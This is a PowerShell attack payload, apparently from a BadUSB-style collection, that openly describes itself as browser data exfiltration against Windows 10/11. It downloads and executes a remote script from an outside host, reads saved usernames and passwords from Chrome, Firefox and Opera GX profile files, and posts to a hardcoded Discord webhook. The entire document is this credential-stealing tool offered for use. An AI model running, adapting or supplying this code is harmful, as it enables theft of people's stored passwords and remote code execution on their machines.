# Title: Browser Data Exfiltration with Remote Script Execution
# Author: Jakoby
# Description: This payload extracts browser history, bookmarks, and saved usernames/passwords from IE, Chrome, Firefox, and Opera GX on Windows 10/11 targets.

# Target OS: Windows 10, 11

# Define exfiltration method (Discord webhook)
$dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Check if Discord webhook is set
if ([string]::IsNullOrEmpty($dc)) {
    Write-Host 'No exfiltration method set. Exiting.'
    exit
}

# Download and execute remote script via Invoke-RestMethod
try {
    $scriptUrl = 'https://jakoby.lol/hgw'
    Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing).Content
} catch {
    Write-Host 'Failed to download and execute the data extraction script.'
    exit
}

# Extract saved usernames and passwords from Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    $chromeCredentials = "SELECT origin_url, username_value, password_value FROM logins"
    $sqliteCommand = "sqlite3.exe"
    $chromeData = & $sqliteCommand $chromePath "$chromeCredentials"
    Write-Output "[Chrome Credentials]: $chromeData"
}

# Extract saved usernames and passwords from Firefox
$firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfilePath) {
    $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
    foreach ($profile in $firefoxProfiles) {
        $loginsJson = Join-Path -Path $profile.FullName -ChildPath 'logins.json'
        if (Test-Path $loginsJson) {
            $firefoxData = Get-Content -Path $loginsJson | ConvertFrom-Json
            Write-Output "[Firefox Credentials]: $($firefoxData.logins)"
        }
    }
}

# Extract saved usernames and passwords from Opera GX
$operaPath = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
if (Test-Path $operaPath) {
    $operaCredentials = "SELECT origin_url, username_value, password_value FROM logins"
    $operaData = & $sqliteCommand $operaPath "$operaCredentials"
    Write-Output "[Opera GX Credentials]: $operaData"
}

# Send completion notification to Discord
try {
    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser credentials.' } | ConvertTo-Json
    Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
} catch {
    Write-Host 'Failed to send notification to Discord webhook.'
}
